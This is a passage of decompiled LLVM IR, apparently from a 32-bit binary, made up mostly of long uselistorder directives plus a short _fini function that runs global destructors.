624, 127, 465, 466, 625, 42, 39, 40, 41, 467, 355, 356, 468, 202, 469, 291, 470, 119, 257, 258, 203, 471, 43, 44, 204, 615, 472, 205, 584, 45, 206, 473, 207, 474, 292, 208, 475, 209, 476, 148, 149, 477, 210, 478, 211, 479, 212, 480, 213, 481, 214, 482, 215, 483, 216, 484, 217, 485, 218, 486, 219, 487, 220, 46, 47, 48, 49, 488, 50, 51, 52, 53, 54, 221, 489, 222, 490, 223, 491, 224, 492, 225, 493, 226, 494, 227, 495, 228, 496, 229, 497, 230, 498, 231, 499, 232, 500, 233, 501, 234, 502, 235, 503, 236, 504, 237, 505, 238, 506, 239, 507, 240, 508, 241, 509, 242, 510, 243, 511, 512, 513, 514, 515, 516, 517, 293, 357, 518, 294, 358, 136, 295, 359, 296, 360, 297, 298, 578, 55, 56, 57, 299, 58, 244, 245, 59, 60, 61, 62, 616, 617, 63, 64, 580, 246, 579, 519, 137, 65, 66, 247, 67, 248, 628, 68, 520, 249, 69, 280, 300, 361, 521, 250, 302, 362, 301, 522, 281, 282, 523, 524, 525, 70, 71, 526, 72, 73, 527, 567, 568, 569, 140, 528, 303, 529, 581, 74, 75, 304, 363, 76, 530, 305, 77, 582, 307, 306, 531, 308, 78, 532, 79, 533, 534, 80, 535, 81, 536, 537, 82, 83, 278, 279, 86, 84, 85, 87, 309, 88, 89, 91, 90, 92, 310, 93, 94, 538, 95, 96, 539, 540, 541, 542, 543, 97, 544, 311, 98, 312, 99, 313, 100, 101, 314, 102, 315, 103, 316, 317, 104, 545, 318, 319, 343, 546, 547, 548, 320, 587, 549, 321, 588, 550, 322, 589, 141, 323, 324, 325, 590, 326, 105, 551, 552, 327, 591, 553, 328, 592, 554, 329, 593, 142, 330, 331, 555, 556, 332, 594, 557, 333, 595, 558, 334, 596, 143, 335, 336, 337, 338, 341, 339, 340, 342, 106, 107, 108, 344, 345, 346, 109, 559, 110, 560, 561, 138, 562, 111, 112, 113, 563, 564, 565, 566, 347, 139, 348, 349, 350 }
  uselistorder i32* @global_var_806f004.927, { 1, 0 }
  uselistorder i32 1, { 1008, 2253, 516, 2254, 618, 2255, 2256, 273, 1960, 1894, 1853, 1011, 1010, 1009, 1932, 1013, 1012, 194, 1015, 1014, 1961, 110, 109, 108, 107, 484, 619, 620, 2257, 518, 2260, 865, 2261, 2262, 2263, 517, 2264, 542, 958, 112, 111, 2265, 2266, 1017, 1016, 403, 2269, 1018, 2270, 1019, 404, 2271, 2272, 1020, 405, 406, 699, 1944, 485, 486, 1945, 1946, 543, 1021, 103, 102, 0, 1933, 337, 335, 336, 1023, 1022, 1026, 1025, 1024, 166, 879, 544, 880, 997, 1029, 1028, 1027, 2374, 2375, 1030, 100, 99, 101, 1031, 1032, 407, 1, 612, 1963, 2197, 2198, 2199, 621, 2200, 2139, 2140, 2141, 545, 2144, 546, 2145, 2146, 2142, 2143, 1034, 1033, 2273, 2274, 2275, 1035, 411, 410, 408, 409, 785, 1036, 258, 622, 623, 55, 56, 57, 700, 547, 1038, 1037, 58, 786, 1039, 1040, 151, 1041, 237, 787, 2422, 2423, 2428, 1043, 1042, 33, 1044, 2147, 788, 701, 2424, 2425, 2426, 2427, 1047, 1046, 1045, 31, 30, 32, 624, 1051, 1050, 1049, 1048, 210, 1052, 789, 1053, 487, 2276, 2277, 502, 2278, 625, 519, 520, 2279, 2280, 501, 2282, 2284, 2285, 2286, 2287, 626, 1057, 1056, 1055, 1054, 2292, 2293, 2294, 2295, 2296, 2297, 2298, 2299, 500, 548, 2300, 627, 2301, 2302, 2303, 628, 2304, 2305, 629, 2318, 2319, 2320, 2321, 2322, 790, 998, 1059, 1058, 19, 20, 1857, 2267, 503, 2268, 156, 1060, 1934, 1935, 1062, 1061, 412, 413, 1065, 1064, 1063, 1067, 1066, 385, 1068, 791, 1070, 1069, 1071, 792, 1072, 793, 1073, 794, 1075, 1074, 1076, 795, 521, 1936, 1937, 1938, 1939, 1078, 1077, 308, 309, 702, 326, 703, 327, 1908, 310, 311, 1909, 312, 313, 1910, 314, 315, 1911, 295, 296, 1079, 302, 301, 300, 1912, 1080, 298, 299, 297, 384, 383, 704, 881, 549, 1081, 171, 705, 1947, 1948, 1949, 550, 1082, 382, 1083, 143, 142, 552, 553, 554, 555, 556, 551, 1084, 164, 165, 706, 707, 557, 1085, 245, 708, 959, 246, 709, 1086, 960, 251, 252, 710, 711, 1940, 1941, 558, 1087, 106, 105, 1942, 559, 630, 1089, 1088, 416, 414, 417, 415, 1943, 560, 631, 1091, 1090, 420, 418, 421, 419, 712, 713, 561, 1092, 104, 714, 715, 562, 1093, 81, 563, 422, 2, 1094, 716, 717, 1950, 1951, 1952, 718, 1096, 1095, 352, 356, 355, 354, 353, 1098, 1097, 423, 1953, 1954, 1955, 1101, 1100, 1099, 82, 1956, 1957, 1958, 1959, 1102, 719, 1962, 1104, 1103, 325, 1106, 1105, 1107, 720, 882, 721, 722, 1964, 1109, 1108, 322, 324, 323, 1110, 231, 1112, 1111, 1114, 1113, 1115, 1117, 1116, 1119, 1118, 1121, 1120, 1123, 1122, 723, 1125, 1124, 1126, 564, 3, 1127, 84, 83, 28, 29, 1965, 565, 1854, 425, 426, 424, 188, 1129, 1128, 961, 268, 796, 1132, 1131, 1130, 632, 1913, 1914, 633, 797, 1915, 1916, 1917, 1918, 1147, 1146, 1145, 1144, 1143, 1142, 1141, 1140, 1139, 962, 1138, 1137, 1136, 1135, 1134, 1133, 161, 159, 160, 2376, 1148, 1149, 1154, 1153, 1152, 1151, 1150, 24, 724, 725, 1895, 798, 1155, 25, 26, 27, 1966, 1162, 1161, 1160, 1159, 1158, 1157, 1156, 154, 1164, 1163, 2201, 2202, 2203, 1165, 367, 1166, 2377, 1167, 180, 181, 726, 2288, 963, 427, 779, 2378, 2379, 2380, 634, 799, 2381, 1168, 2382, 635, 2383, 2384, 1180, 1179, 1178, 1177, 1176, 1175, 1174, 1173, 1172, 1171, 1170, 1169, 428, 429, 431, 432, 436, 434, 430, 435, 433, 437, 2385, 2386, 4, 148, 147, 146, 145, 144, 1181, 438, 439, 1182, 329, 330, 2387, 2388, 1183, 208, 207, 209, 2456, 2457, 2458, 91, 636, 1184, 51, 1185, 2389, 1186, 45, 49, 50, 46, 48, 47, 2390, 727, 1189, 1188, 1187, 1190, 39, 38, 37, 1191, 42, 41, 40, 1192, 321, 1193, 347, 1194, 440, 1195, 441, 1196, 442, 1197, 22, 21, 23, 637, 262, 1199, 1198, 1201, 1200, 121, 1202, 238, 1203, 233, 1205, 1204, 328, 1206, 1207, 316, 2459, 2460, 2461, 1210, 1209, 1208, 219, 220, 218, 221, 2485, 728, 1212, 1211, 1215, 1214, 1213, 443, 1216, 729, 883, 1855, 566, 1222, 1221, 1220, 1219, 1218, 1217, 264, 265, 730, 731, 2148, 2149, 2150, 2151, 2152, 2153, 567, 2154, 2155, 2156, 5, 2157, 866, 2160, 2161, 2162, 2163, 2164, 2165, 2166, 2169, 2170, 732, 2171, 638, 1223, 2167, 2168, 1225, 1224, 448, 445, 444, 446, 447, 2229, 1228, 1227, 1226, 373, 371, 372, 187, 800, 1229, 2230, 2231, 2232, 873, 2233, 1230, 249, 250, 247, 248, 733, 734, 884, 608, 885, 886, 609, 887, 1231, 1232, 131, 132, 2362, 488, 504, 2363, 964, 1233, 114, 116, 113, 115, 1234, 360, 358, 357, 362, 361, 359, 95, 93, 96, 92, 94, 801, 1236, 1235, 802, 1237, 803, 1238, 804, 1241, 1240, 1239, 888, 1244, 1243, 1242, 449, 805, 2470, 2471, 2472, 1245, 226, 227, 2465, 2466, 522, 2467, 2468, 2469, 98, 97, 889, 2464, 639, 450, 452, 451, 806, 1246, 90, 807, 2429, 2430, 2431, 2432, 2433, 2434, 2435, 2436, 2437, 640, 2438, 2439, 2440, 2441, 2442, 737, 2443, 2444, 483, 738, 2445, 2446, 2447, 2448, 735, 736, 2449, 2450, 2451, 1249, 1248, 1247, 190, 192, 189, 191, 193, 1250, 739, 740, 1251, 741, 742, 743, 641, 642, 643, 890, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1967, 1968, 475, 808, 1969, 568, 1268, 999, 1267, 965, 1266, 1265, 966, 79, 80, 1970, 780, 1971, 613, 809, 1972, 569, 1273, 1272, 1271, 1270, 1269, 453, 454, 2323, 570, 2324, 810, 614, 811, 2328, 571, 1278, 1277, 1276, 1275, 1274, 61, 62, 1279, 1280, 2172, 2173, 1281, 744, 745, 2329, 2330, 2331, 2332, 523, 1973, 1974, 1975, 1976, 1977, 1978, 1979, 1980, 1981, 1285, 1284, 1283, 967, 1282, 968, 243, 242, 244, 1982, 1983, 1287, 1286, 969, 970, 201, 203, 202, 204, 206, 205, 746, 2306, 2307, 489, 2308, 2309, 644, 2310, 778, 2311, 2313, 1288, 182, 747, 2317, 2314, 2315, 2316, 524, 1289, 374, 2209, 2210, 2211, 2212, 2213, 1291, 971, 972, 1290, 241, 1292, 1919, 1920, 1921, 1922, 1923, 645, 1924, 646, 1925, 1926, 1927, 1928, 1929, 1304, 1303, 1302, 1301, 1300, 1299, 1298, 975, 973, 1297, 1296, 1295, 1294, 1293, 976, 974, 72, 70, 69, 71, 1930, 1308, 1307, 1306, 1305, 52, 53, 2214, 1311, 1310, 1309, 54, 748, 1312, 2281, 1313, 15, 2091, 2092, 2093, 2258, 2259, 2391, 2392, 1000, 1314, 364, 2065, 2066, 2067, 2068, 2069, 2070, 2071, 2393, 2325, 2326, 2327, 1316, 1315, 341, 340, 781, 2158, 2159, 2333, 2334, 1318, 1317, 198, 197, 196, 782, 2283, 617, 2312, 2487, 1319, 86, 85, 87, 1320, 2138, 66, 65, 1322, 1321, 749, 2335, 2336, 2337, 977, 77, 78, 2289, 2290, 2291, 647, 76, 812, 813, 814, 2338, 1323, 815, 816, 2339, 648, 6, 1325, 1324, 455, 817, 1326, 818, 1327, 819, 2340, 2341, 1328, 117, 118, 820, 1329, 821, 1330, 750, 1331, 751, 1332, 2394, 2395, 1858, 650, 2396, 2397, 2398, 2399, 2400, 2402, 2403, 2404, 651, 2405, 2406, 891, 649, 2407, 652, 2408, 2409, 2410, 2401, 1336, 1335, 1334, 1333, 277, 279, 278, 274, 276, 275, 280, 2411, 1337, 186, 183, 185, 184, 653, 1338, 2412, 2413, 1340, 1339, 281, 282, 2414, 2415, 574, 573, 752, 2416, 753, 2417, 2418, 572, 2419, 654, 2420, 822, 2421, 1342, 1341, 133, 135, 134, 136, 655, 823, 7, 824, 1343, 754, 1344, 1345, 158, 157, 2462, 1347, 1346, 456, 755, 2486, 1348, 457, 825, 1349, 476, 826, 1350, 2342, 2343, 2344, 2345, 2346, 2347, 2348, 2349, 615, 2350, 1355, 1354, 1353, 1352, 1351, 64, 63, 827, 656, 828, 829, 783, 867, 1360, 1359, 978, 1358, 1357, 1356, 67, 68, 830, 1364, 1363, 1362, 1361, 1367, 1366, 1365, 2055, 1369, 1368, 1370, 1371, 1372, 1373, 1374, 458, 831, 2174, 1375, 832, 2351, 2352, 833, 834, 2353, 1377, 1376, 835, 657, 1379, 1378, 1380, 756, 1383, 1382, 1381, 153, 836, 1384, 1386, 1385, 1388, 1387, 195, 1390, 1389, 152, 1392, 1391, 173, 1394, 1393, 199, 1395, 179, 1396, 253, 1398, 1397, 150, 1399, 363, 1401, 1400, 390, 1402, 375, 1403, 339, 1404, 225, 1405, 257, 1406, 234, 1407, 232, 892, 575, 757, 1408, 868, 576, 1984, 1985, 758, 1409, 163, 1411, 1410, 254, 1413, 1412, 263, 1414, 465, 229, 1415, 376, 1417, 1416, 255, 1418, 213, 1419, 285, 1420, 379, 1986, 1422, 1421, 402, 1424, 1423, 393, 1425, 212, 1426, 240, 1427, 334, 1428, 200, 1429, 286, 1430, 459, 1431, 1432, 162, 1433, 460, 1435, 1434, 261, 1436, 149, 1437, 172, 389, 1438, 1439, 283, 1442, 1441, 1440, 256, 1446, 1445, 1444, 1443, 284, 1448, 1447, 291, 292, 289, 290, 1449, 2452, 2453, 8, 9, 10, 1450, 2480, 1451, 1987, 1452, 2463, 1453, 167, 759, 658, 1456, 1455, 1454, 577, 578, 869, 122, 123, 893, 1458, 1457, 305, 306, 894, 1460, 1459, 266, 267, 837, 1461, 461, 2454, 2455, 1465, 1464, 1463, 1462, 1988, 1990, 1469, 1468, 1467, 1466, 1470, 1471, 579, 580, 124, 1989, 1472, 462, 377, 1474, 1473, 126, 127, 1476, 1475, 88, 89, 1477, 1480, 1479, 1478, 317, 1482, 1481, 59, 60, 1483, 387, 1485, 1484, 381, 380, 1486, 270, 271, 269, 272, 1489, 1488, 1487, 214, 1991, 1491, 1490, 16, 17, 1992, 378, 616, 581, 582, 583, 584, 1492, 760, 610, 838, 1494, 1493, 235, 1497, 1496, 1495, 659, 2234, 1500, 1499, 1498, 11, 895, 660, 775, 1505, 1504, 1503, 1502, 1501, 386, 661, 1507, 1506, 1508, 1510, 1509, 1511, 1512, 1514, 1513, 896, 611, 2003, 1520, 1519, 1518, 1517, 1516, 1515, 348, 1859, 1522, 1521, 1524, 1523, 477, 1525, 1526, 1527, 1528, 1530, 1529, 1532, 1531, 1533, 478, 1534, 1535, 1536, 1537, 1539, 1538, 479, 1541, 1540, 1542, 1543, 1545, 1544, 1547, 1546, 1549, 1548, 1551, 1550, 1553, 1552, 1554, 1555, 1557, 1556, 1558, 1560, 1559, 761, 762, 1993, 1994, 1995, 1996, 1561, 119, 776, 662, 1562, 392, 391, 2481, 2482, 2483, 897, 2484, 170, 169, 168, 763, 2479, 1564, 1563, 139, 138, 1565, 525, 585, 588, 586, 587, 1567, 1566, 140, 898, 2478, 526, 1568, 1569, 463, 1997, 1998, 141, 1570, 155, 2473, 764, 2474, 2475, 2476, 388, 1571, 663, 589, 1573, 1572, 1575, 1574, 1576, 839, 1999, 590, 591, 2000, 1580, 1579, 1578, 1577, 664, 592, 593, 665, 1581, 1584, 1583, 1582, 303, 304, 1585, 294, 293, 1586, 2001, 1589, 1588, 1587, 2002, 666, 1592, 1591, 1590, 2005, 667, 1595, 1594, 1593, 1596, 137, 228, 1597, 2004, 1598, 464, 765, 766, 840, 1600, 1599, 1601, 472, 1602, 230, 2006, 852, 851, 1896, 767, 844, 845, 846, 847, 848, 843, 849, 1897, 850, 1898, 1899, 841, 1900, 842, 1901, 1902, 1856, 853, 594, 854, 2009, 2010, 668, 1606, 1605, 1604, 1603, 215, 216, 217, 669, 2007, 2008, 1608, 1607, 473, 1609, 1610, 1931, 671, 670, 1613, 1612, 1611, 351, 1614, 2011, 2012, 541, 1616, 1615, 855, 899, 1617, 1620, 1619, 1618, 2477, 1625, 1624, 1623, 1622, 1621, 1626, 1628, 1627, 239, 1629, 1630, 1633, 1632, 1631, 2013, 537, 2014, 538, 2015, 2016, 673, 2017, 2018, 2019, 768, 672, 2020, 674, 2021, 2022, 2023, 490, 505, 527, 856, 1639, 1001, 1638, 1637, 1636, 1635, 1634, 979, 259, 260, 2024, 2025, 2026, 2027, 2028, 1640, 1646, 1645, 1644, 1643, 1642, 1641, 466, 467, 2029, 2030, 506, 2031, 2032, 2033, 2034, 2035, 2036, 2037, 2038, 2039, 980, 491, 2040, 528, 507, 2041, 2042, 2043, 2044, 492, 2045, 2046, 2047, 2048, 2049, 909, 908, 907, 906, 905, 904, 903, 902, 901, 900, 539, 2050, 2051, 2052, 2053, 1648, 1647, 981, 120, 493, 2054, 1650, 1649, 1651, 2056, 1652, 2057, 2058, 675, 530, 2059, 2060, 2061, 1860, 676, 529, 2062, 2063, 1861, 910, 1662, 1661, 1660, 1659, 1658, 1657, 1656, 1655, 1654, 1653, 177, 178, 2064, 911, 677, 2072, 2073, 678, 2074, 2075, 2076, 1862, 679, 2077, 2078, 680, 2079, 2080, 2081, 1863, 681, 2082, 912, 1669, 1668, 1667, 1666, 1665, 1664, 1663, 287, 288, 595, 1670, 338, 1672, 1671, 1673, 596, 1674, 2083, 2084, 2085, 1676, 1675, 982, 983, 468, 469, 1679, 1678, 1677, 1682, 1681, 984, 1680, 470, 1864, 1865, 682, 1683, 369, 370, 2086, 1685, 1684, 2087, 1903, 597, 1904, 1905, 1906, 1907, 2088, 1692, 1002, 1691, 1690, 1689, 1688, 1687, 1686, 331, 332, 683, 2089, 2090, 1695, 1694, 1693, 874, 494, 2094, 2095, 1696, 857, 769, 770, 2096, 1698, 1697, 2097, 2098, 2099, 2100, 598, 2101, 2102, 2103, 480, 1706, 1705, 1704, 1703, 1702, 1701, 1700, 1699, 345, 346, 2104, 2105, 599, 2106, 2107, 2108, 481, 1714, 1713, 1712, 1711, 1710, 1709, 1708, 1707, 365, 366, 684, 685, 2109, 771, 1716, 1715, 772, 913, 1717, 1720, 1719, 1718, 2110, 686, 1723, 1722, 1721, 211, 2111, 1866, 1867, 1868, 508, 1869, 1870, 1871, 1872, 509, 1873, 510, 1874, 773, 914, 2112, 1724, 1729, 1728, 1727, 1726, 1725, 985, 73, 75, 74, 1731, 1730, 1733, 1732, 2113, 2114, 2115, 2123, 2124, 536, 2125, 1736, 1735, 1734, 18, 858, 12, 1738, 1737, 986, 687, 2116, 532, 2117, 2118, 688, 2119, 531, 2121, 2122, 689, 774, 915, 2120, 987, 2126, 1739, 916, 1740, 2134, 2135, 482, 2127, 2128, 2129, 2130, 2131, 2132, 1743, 1003, 1742, 1741, 471, 2133, 1746, 1745, 1744, 34, 2136, 2137, 1748, 1747, 917, 918, 2175, 2176, 859, 870, 691, 690, 1750, 1749, 307, 1751, 2177, 919, 1757, 1756, 1755, 1754, 1753, 1752, 395, 394, 396, 2178, 2179, 2180, 2181, 2182, 2183, 495, 2184, 2185, 871, 1875, 496, 497, 511, 512, 533, 920, 921, 922, 956, 1763, 1004, 1762, 1761, 1760, 1759, 1758, 988, 128, 129, 130, 923, 924, 1876, 2186, 1765, 1764, 2187, 13, 2188, 1766, 2189, 2190, 692, 2191, 2192, 925, 926, 1767, 1770, 1769, 1768, 319, 318, 320, 2193, 2194, 927, 1771, 928, 1773, 1772, 125, 2226, 1774, 2195, 860, 600, 784, 1877, 1878, 929, 1777, 1776, 1775, 222, 223, 224, 2196, 2204, 1880, 1881, 1882, 513, 1883, 1884, 1885, 1886, 1887, 1888, 2205, 930, 1879, 931, 1784, 1783, 1782, 989, 991, 1781, 990, 1780, 1779, 1778, 400, 401, 2206, 2207, 932, 1889, 933, 1785, 1792, 1791, 1790, 992, 994, 1789, 993, 1788, 1787, 1786, 236, 2208, 861, 934, 1890, 935, 1797, 1796, 1795, 1794, 1793, 777, 2215, 936, 862, 937, 938, 939, 1802, 1801, 1800, 1799, 1798, 2216, 2217, 693, 2218, 2219, 940, 941, 1803, 942, 1806, 1805, 1804, 398, 397, 399, 2220, 2221, 943, 1807, 944, 1809, 1808, 945, 946, 1810, 2222, 2223, 694, 2224, 2225, 947, 948, 1812, 1811, 175, 174, 176, 2227, 2228, 949, 1813, 950, 1815, 1814, 2235, 2236, 2237, 2238, 951, 1816, 1821, 1820, 1819, 1818, 1817, 995, 343, 342, 344, 2239, 601, 2240, 1829, 1828, 1827, 1826, 1825, 1824, 1823, 1822, 43, 44, 2241, 2242, 2243, 952, 953, 514, 863, 954, 1831, 1830, 35, 36, 2244, 2245, 368, 2246, 2247, 2248, 2249, 474, 2250, 498, 499, 2251, 2252, 602, 1834, 1833, 1832, 333, 603, 604, 515, 605, 606, 2354, 2355, 695, 535, 2356, 2357, 2358, 1891, 696, 534, 2359, 2360, 1892, 955, 1839, 1838, 1837, 1836, 1835, 349, 350, 697, 1840, 698, 2361, 1893, 864, 957, 1847, 1846, 1845, 1844, 1843, 1842, 1841, 2364, 2365, 996, 540, 607, 872, 2366, 14, 2367, 1848, 875, 2368, 2369, 876, 2370, 2371, 877, 878, 2372, 2373, 1849, 1851, 1850, 1852, 1005, 1006, 1007 }
  uselistorder label %dec_label_pc_80676b6, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_80676cb = load i32, i32* @ebx, align 4
  %v1_80676cc = call i32 @__get_pc_thunk_bx(i32 %v0_80676cb)
  store i32 %v1_80676cc, i32* @eax, align 4
  %v0_80676d7 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_80676d7

; uselistorder directives
  uselistorder i32* @eax, { 35, 33, 17, 1, 42, 122, 36, 123, 37, 3, 294, 295, 2, 296, 0, 98, 297, 99, 298, 130, 124, 131, 132, 19, 20, 8, 251, 252, 253, 255, 256, 257, 258, 259, 254, 333, 102, 299, 103, 300, 301, 302, 303, 100, 101, 310, 40, 125, 38, 16, 39, 126, 127, 128, 9, 21, 321, 133, 129, 41, 134, 135, 335, 334, 136, 137, 138, 139, 322, 323, 324, 140, 141, 142, 110, 325, 22, 143, 69, 351, 352, 392, 104, 393, 10, 391, 23, 260, 261, 262, 77, 78, 265, 4, 266, 267, 269, 268, 144, 361, 360, 336, 338, 337, 43, 145, 146, 147, 149, 44, 148, 304, 309, 305, 306, 307, 308, 111, 112, 113, 114, 11, 263, 264, 12, 13, 326, 328, 327, 329, 330, 332, 115, 331, 311, 235, 150, 152, 151, 153, 155, 154, 32, 283, 156, 158, 157, 384, 390, 159, 160, 353, 355, 356, 358, 354, 357, 24, 25, 26, 161, 162, 342, 343, 345, 5, 346, 347, 350, 163, 164, 165, 166, 168, 169, 170, 171, 172, 344, 116, 117, 339, 340, 341, 348, 349, 167, 173, 174, 175, 285, 94, 286, 176, 14, 284, 27, 177, 178, 179, 382, 386, 388, 6, 389, 383, 387, 374, 375, 379, 381, 385, 377, 378, 376, 380, 362, 359, 28, 180, 181, 182, 183, 7, 184, 185, 186, 187, 189, 191, 192, 193, 196, 197, 188, 118, 119, 198, 194, 195, 190, 199, 200, 201, 315, 316, 318, 317, 202, 203, 18, 105, 106, 107, 34, 108, 213, 204, 206, 209, 210, 211, 205, 207, 208, 120, 212, 214, 363, 364, 365, 368, 369, 371, 372, 373, 370, 121, 366, 367, 45, 215, 216, 217, 218, 219, 220, 46, 47, 221, 48, 49, 222, 50, 51, 223, 52, 53, 224, 54, 55, 225, 56, 57, 226, 58, 59, 227, 60, 61, 228, 62, 63, 229, 64, 65, 66, 67, 230, 231, 232, 233, 234, 68, 70, 71, 72, 73, 74, 97, 236, 237, 238, 75, 76, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 109, 29, 79, 270, 80, 271, 81, 272, 82, 83, 84, 273, 274, 275, 276, 277, 278, 279, 280, 85, 86, 87, 88, 89, 281, 90, 91, 92, 282, 93, 95, 96, 287, 288, 289, 290, 291, 30, 292, 293, 312, 313, 314, 394, 319, 320, 15, 31 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 3205, 3208, 3206, 3207, 1932, 361, 921, 922, 923, 924, 925, 926, 2140, 310, 178, 179, 1868, 347, 362, 2312, 2407, 180, 0, 1933, 3400, 77, 182, 3211, 3219, 3213, 3214, 78, 154, 3215, 3216, 3217, 1934, 3218, 181, 348, 349, 350, 3209, 3210, 363, 3220, 3221, 3223, 3224, 3222, 3225, 707, 3227, 3228, 3229, 3230, 3231, 3232, 365, 1935, 364, 2372, 2373, 79, 157, 1936, 708, 1937, 2374, 2375, 2376, 2377, 2313, 158, 1938, 2413, 366, 2408, 2409, 367, 3401, 3444, 927, 3445, 3448, 3447, 309, 640, 322, 928, 929, 3580, 930, 931, 3581, 368, 3402, 3403, 3404, 3405, 183, 184, 185, 1939, 369, 932, 2378, 2379, 2380, 2381, 2390, 370, 3407, 371, 3421, 3422, 1940, 3423, 372, 2213, 1, 373, 2414, 1941, 311, 312, 80, 186, 3039, 313, 314, 334, 2911, 2912, 641, 2913, 2914, 2915, 2916, 2917, 2918, 2919, 2921, 2922, 2923, 315, 2924, 316, 2920, 1942, 3233, 187, 1943, 3424, 374, 3449, 3452, 3453, 60, 709, 376, 375, 3454, 3455, 710, 3456, 3457, 3458, 1944, 3459, 3460, 3461, 3462, 377, 378, 2342, 3583, 379, 380, 1945, 3584, 189, 2314, 2315, 2316, 188, 2, 381, 3425, 325, 2926, 2925, 642, 2927, 1946, 3585, 351, 3586, 711, 1947, 3587, 3129, 3130, 3132, 3131, 712, 2328, 382, 383, 933, 713, 384, 934, 3239, 3234, 3235, 3236, 3238, 335, 81, 3252, 3253, 3254, 3255, 3256, 3257, 3263, 3264, 3265, 3266, 3258, 3259, 3260, 3261, 3262, 190, 191, 1948, 3267, 3268, 192, 193, 194, 1949, 3269, 3270, 3271, 3272, 3273, 3275, 3276, 3277, 3286, 3287, 3288, 3289, 3290, 3291, 3292, 3293, 3294, 3295, 73, 74, 75, 195, 1950, 3226, 2317, 2318, 859, 863, 860, 2319, 2320, 196, 159, 1951, 2321, 2322, 861, 2323, 1952, 2324, 862, 2325, 385, 2326, 2327, 386, 1953, 2329, 2330, 1954, 352, 2331, 2337, 2332, 2335, 2334, 643, 2336, 2333, 353, 2338, 2341, 2339, 2340, 2343, 2344, 2345, 2346, 1955, 2349, 199, 2351, 2350, 198, 2352, 2353, 2354, 2355, 197, 2356, 2357, 2358, 2347, 2348, 387, 388, 389, 1956, 390, 1957, 391, 1958, 392, 1959, 393, 1960, 394, 1961, 395, 935, 3408, 3409, 3416, 3417, 3418, 1872, 3419, 2359, 397, 1962, 2382, 396, 1963, 2383, 2384, 2385, 1873, 2386, 2387, 2388, 2389, 3, 2432, 2433, 200, 2434, 317, 3410, 3411, 3412, 3413, 1874, 4, 3414, 3415, 398, 2360, 2361, 2362, 1875, 399, 2363, 1964, 400, 2364, 1965, 401, 1966, 2365, 1876, 2366, 1967, 2367, 336, 1968, 2368, 2369, 1969, 2370, 402, 3427, 1877, 403, 2371, 1878, 3426, 2391, 406, 1970, 2392, 2393, 2394, 2395, 405, 404, 936, 937, 1971, 2396, 5, 2417, 2397, 318, 2398, 2399, 2400, 2401, 2402, 1972, 1973, 319, 2403, 2404, 2405, 2406, 407, 1974, 2410, 2411, 2412, 3592, 408, 3588, 3589, 3590, 864, 2416, 2415, 1975, 2418, 2419, 2420, 2421, 2422, 411, 410, 644, 1976, 1977, 2423, 2424, 2425, 2426, 409, 2427, 412, 3591, 413, 645, 414, 2428, 2429, 2430, 2431, 415, 3420, 416, 417, 2435, 2436, 6, 2437, 2438, 2439, 7, 3428, 3429, 3430, 3431, 3432, 3433, 2440, 2141, 1869, 2441, 2442, 2443, 2444, 8, 2445, 2446, 2447, 3434, 714, 2214, 2215, 2216, 2217, 2218, 715, 2219, 2220, 2222, 2221, 646, 2223, 865, 2224, 866, 2225, 2226, 2227, 2228, 201, 202, 203, 2229, 2230, 2231, 2234, 2235, 2236, 867, 868, 869, 2232, 2233, 2237, 2238, 2239, 1978, 3436, 3437, 3438, 418, 3439, 3440, 3441, 419, 1827, 3442, 3443, 420, 2142, 422, 421, 2448, 2449, 2450, 423, 2451, 2452, 2453, 2454, 2455, 2456, 2457, 2458, 2459, 1979, 2460, 938, 3593, 3594, 337, 716, 354, 1980, 338, 3463, 424, 3464, 82, 339, 320, 3465, 647, 425, 3466, 9, 3467, 3240, 3244, 3245, 717, 3246, 1981, 3468, 939, 3469, 3470, 3471, 3472, 3473, 3474, 3475, 3476, 426, 1982, 3477, 3478, 3479, 3480, 427, 3481, 1983, 428, 633, 940, 429, 1984, 1985, 1986, 718, 3482, 3483, 3484, 3485, 719, 688, 689, 3486, 3487, 3488, 3489, 3490, 3491, 1987, 720, 3492, 430, 1988, 3493, 431, 721, 722, 3494, 3495, 941, 3247, 3248, 3249, 1989, 3496, 3497, 3498, 3499, 301, 3634, 3635, 3636, 3637, 321, 648, 432, 433, 1990, 3241, 3243, 1991, 434, 723, 340, 3500, 649, 1992, 1993, 1994, 3501, 435, 3502, 2784, 2785, 436, 2461, 2462, 2463, 437, 2775, 3638, 3639, 3640, 942, 3641, 2776, 3642, 3643, 3644, 2786, 2787, 2788, 2789, 3133, 2736, 2464, 3582, 943, 3645, 3595, 3618, 3633, 3646, 3647, 83, 360, 1995, 84, 1996, 1997, 3763, 3768, 650, 3769, 438, 1828, 3759, 10, 3648, 3649, 3650, 439, 440, 2143, 1870, 441, 1998, 3134, 724, 725, 442, 3135, 3136, 443, 444, 3138, 3137, 3139, 3142, 944, 1829, 3143, 3145, 3144, 3146, 445, 446, 447, 448, 449, 2928, 2929, 945, 946, 947, 948, 2930, 2931, 2932, 2933, 2934, 2935, 2936, 2937, 2938, 2939, 2940, 2941, 2942, 2943, 726, 341, 342, 2948, 2945, 2946, 653, 652, 651, 2944, 654, 2949, 2950, 2951, 450, 2952, 2953, 2954, 333, 2955, 2956, 2957, 2958, 690, 86, 85, 160, 161, 3147, 3148, 451, 1999, 452, 2000, 3651, 3664, 3149, 3150, 3151, 3152, 2001, 2002, 3153, 906, 2003, 453, 454, 455, 456, 949, 950, 323, 951, 3156, 3155, 952, 3157, 457, 458, 2004, 2465, 2005, 2466, 459, 2006, 460, 2007, 3365, 204, 3366, 3367, 3368, 11, 2008, 3371, 953, 2467, 2468, 2469, 2470, 2009, 461, 3672, 1830, 462, 727, 3731, 3734, 3733, 3686, 3689, 3680, 3681, 3682, 728, 3683, 3684, 3685, 954, 3678, 955, 3679, 956, 3596, 3597, 3598, 3599, 3600, 3601, 3602, 3603, 3604, 729, 730, 3605, 2010, 3617, 2011, 2012, 957, 1831, 2013, 958, 1832, 463, 2014, 3606, 3607, 464, 465, 959, 1833, 356, 3608, 3609, 3610, 466, 467, 960, 1834, 355, 3611, 655, 3612, 330, 3613, 3614, 3616, 2015, 3615, 12, 3735, 13, 3732, 3140, 3141, 14, 468, 2588, 961, 2589, 2574, 2575, 2576, 15, 16, 731, 3736, 3737, 3738, 3158, 3159, 3160, 2471, 2016, 2017, 2472, 2473, 